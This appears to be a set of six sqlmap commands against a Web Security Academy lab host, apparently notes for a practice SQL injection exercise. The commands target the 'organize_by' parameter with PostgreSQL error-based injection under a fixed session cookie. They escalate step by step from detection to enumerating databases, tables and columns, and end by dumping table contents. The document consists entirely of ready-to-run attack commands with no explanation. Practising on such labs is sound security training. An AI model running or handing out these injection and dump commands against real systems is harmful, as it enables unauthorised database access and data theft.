
sqlmap.py -u "https://0a400023034568c1826b241d00480078.web-security-academy.net/advanced_search?SearchTerm=test&organize_by=DATE&blogArtist=" -p "organize_by" --cookie "session=DwHAZ6cz5lR3eFgXMR1ZAiZsl5Mpgzdv" -batch

sqlmap.py -u "https://0a400023034568c1826b241d00480078.web-security-academy.net/advanced_search?SearchTerm=test&organize_by=DATE&blogArtist=" -p "organize_by" --cookie "session=DwHAZ6cz5lR3eFgXMR1ZAiZsl5Mpgzdv" -batch --flush-session --dbms postgresql --technique E --level 5

sqlmap.py -u "https://0a400023034568c1826b241d00480078.web-security-academy.net/advanced_search?SearchTerm=test&organize_by=DATE&blogArtist=" -p "organize_by" --cookie "session=DwHAZ6cz5lR3eFgXMR1ZAiZsl5Mpgzdv" -batch --dbms postgresql --technique E --level 5 --dbs

sqlmap.py -u "https://0a400023034568c1826b241d00480078.web-security-academy.net/advanced_search?SearchTerm=test&organize_by=DATE&blogArtist=" -p "organize_by" --cookie "session=DwHAZ6cz5lR3eFgXMR1ZAiZsl5Mpgzdv" -batch --dbms postgresql --technique E --level 5 -D DBNAME --tables

sqlmap.py -u "https://0a400023034568c1826b241d00480078.web-security-academy.net/advanced_search?SearchTerm=test&organize_by=DATE&blogArtist=" -p "organize_by" --cookie "session=DwHAZ6cz5lR3eFgXMR1ZAiZsl5Mpgzdv" -batch --dbms postgresql --technique E --level 5 -D DBNAME -T Tablename --columns

sqlmap.py -u "https://0a400023034568c1826b241d00480078.web-security-academy.net/advanced_search?SearchTerm=test&organize_by=DATE&blogArtist=" -p "organize_by" --cookie "session=DwHAZ6cz5lR3eFgXMR1ZAiZsl5Mpgzdv" -batch --dbms postgresql --technique E --level 5 -D DBNAME -T Tablename -C columnname --dump
